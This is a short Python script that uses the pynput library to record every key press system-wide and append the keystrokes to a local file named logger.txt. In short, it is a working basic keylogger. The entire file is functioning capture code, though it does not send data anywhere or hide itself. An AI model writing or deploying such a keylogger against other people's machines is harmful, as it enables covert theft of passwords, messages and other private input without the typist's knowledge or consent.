from pynput.keyboard import Key, Listener


def writetofile(key):
    keydata = str(key)
    keydata = keydata.replace("'", "")

    if keydata == 'Key.space':
        keydata  = ''
    if keydata == 'Key.enter':
        keydata  = '\n'
    if keydata == 'Key.shift':
        keydata  = ''
    if keydata == 'Key.ctrl_l':
        keydata = ''
    if keydata == 'Key.caps_lock':
        keydata = ''
    if keydata == 'Key.ctrl_r':
        keydata = ''
    if keydata == 'Key.backspace':
        keydata = ''

    with open("logger.txt", 'a') as f:
     f.write(keydata)

with Listener(on_press=writetofile) as l:
    l.join()

#control_keyboard() 
